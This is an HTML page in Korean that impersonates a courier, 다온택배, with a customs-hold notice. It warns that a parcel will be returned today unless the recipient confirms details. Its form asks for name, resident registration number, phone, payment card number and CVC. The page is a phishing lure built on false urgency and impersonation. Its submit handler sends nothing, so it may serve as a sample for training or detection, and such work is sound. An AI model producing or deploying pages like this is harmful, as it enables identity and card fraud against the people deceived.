<!doctype html>
<html lang="ko">
<head><meta charset="utf-8"><title>다온택배 통관 보류 안내</title></head>
<body>
<h1>다온택배 해외 배송 통관 보류</h1><p>개인통관 정보 불일치로 물품이 세관에 보류되었습니다. 오늘 중으로 정보를 확인하지 않으면 반송 처리됩니다.</p><form onsubmit="return false"><label>이름 <input name="name" type="text" autocomplete="off"></label><br><label>주민등록번호 <input name="ssn" type="text" autocomplete="off"></label><br><label>휴대폰 번호 <input name="phone" type="tel" autocomplete="off"></label><br><label>관세 결제 카드번호 <input name="card_number" type="text" autocomplete="off"></label><br><label>CVC <input name="cvc" type="password" autocomplete="off"></label><br><button>통관 정보 확인</button></form>
</body>
</html>
